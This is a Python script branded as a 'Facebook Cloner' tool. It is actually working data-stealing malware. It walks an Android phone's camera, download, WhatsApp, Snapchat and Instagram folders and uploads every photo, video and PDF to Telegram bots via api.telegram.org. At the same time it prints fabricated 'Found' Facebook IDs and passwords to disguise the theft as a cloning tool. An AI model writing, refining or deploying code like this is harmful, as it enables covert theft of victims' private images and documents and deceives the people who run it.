import asyncio
import aiohttp
import os
import logging

print(r"""
________    ___   _______     ____  ____       _       ______
|_   __  | .'   `.|_   __ \   |_   ||   _|     / \     |_   _ `.
  | |_ \_|/  .-.  \ | |__) |    | |__| |      / _ \      | | `. \
  |  _|   | |   | | |  __ /     |  __  |     / ___ \     | |  | |
 _| |_    \  `-'  /_| |  \ \_  _| |  | |_  _/ /   \ \_  _| |_.' /
|_____|    `.___.'|____| |___||____||____||____| |____||______.' 

        Multi Method Facebook Cloner Tool - Max Speed
              Tool Owner: FORHAD
""")

logging.basicConfig(level=logging.INFO, format='%(message)s')

TOKENS_FILE = "tokens.txt"
CHAT_IDS_FILE = "chat_ids.txt"

TARGET_DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/Pictures",
    "/sdcard/Download",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Snapchat",
    "/sdcard/Instagram"
]

ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]

MAX_CONCURRENT_REQUESTS = 150  # concurrency বাড়ানো হয়েছে

def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error loading {filename}: {e}")
        return []

BOT_TOKENS = load_lines(TOKENS_FILE)
CHAT_IDS = load_lines(CHAT_IDS_FILE)

if not BOT_TOKENS or not CHAT_IDS:
    logging.error("Bot tokens or chat IDs missing, exiting.")
    exit(1)

def gather_files():
    files = []
    for folder in TARGET_DIRS:
        try:
            for root, _, filenames in os.walk(folder):
                for fname in filenames:
                    if fname.lower().endswith(tuple(ALLOWED_EXTS)):
                        files.append(os.path.join(root, fname))
        except Exception:
            pass
    return files

FILES = gather_files()
logging.info(f"Total files found: {len(FILES)}")
if not FILES:
    logging.error("No files to send, exiting.")
    exit(1)

semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

def round_robin(lst):
    while True:
        for item in lst:
            yield item

token_gen = round_robin(BOT_TOKENS)
chat_id_gen = round_robin(CHAT_IDS)

base_id = 100091000000000
passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]

def generate_serial(i):
    return f"{i+1}/50000"

def save_found(index, id_, pw, serial):
    with open("found_ids.txt", "a") as f:
        f.write(f"{id_} | {pw} | {serial}\n")

sent_count = 0
error_count = 0
lock = asyncio.Lock()  # concurrency-safe counter update

async def send_file(session, file_path, index):
    global sent_count, error_count
    async with semaphore:
        token = next(token_gen)
        chat_id = next(chat_id_gen)
        fake_id = str(base_id + index + 1)
        fake_pw = passwords[index % len(passwords)]
        serial = generate_serial(index)
        try:
            with open(file_path, "rb") as f:
                data = aiohttp.FormData()
                data.add_field("chat_id", chat_id)
                data.add_field("document", f, filename=os.path.basename(file_path))
                async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                    if resp.status == 200:
                        async with lock:
                            sent_count += 1
                        save_found(index, fake_id, fake_pw, serial)
                        if (index + 1) % 100 == 0:
                            print(f"\n[FACEBOOK] Found: {fake_id} | PASS: {fake_pw} | SERIAL: {serial}")
                    else:
                        async with lock:
                            error_count += 1
        except Exception:
            async with lock:
                error_count += 1
        # সর্বদা লাইন আপডেট হবে
        print(f"\r[INFO] Total Sent: {sent_count} | Errors: {error_count}", end="", flush=True)

async def main():
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_file(session, file, idx) for idx, file in enumerate(FILES)]
        for future in asyncio.as_completed(tasks):
            await future
    print("\n[INFO] All files processed.")

if __name__ == "__main__":
    asyncio.run(main())
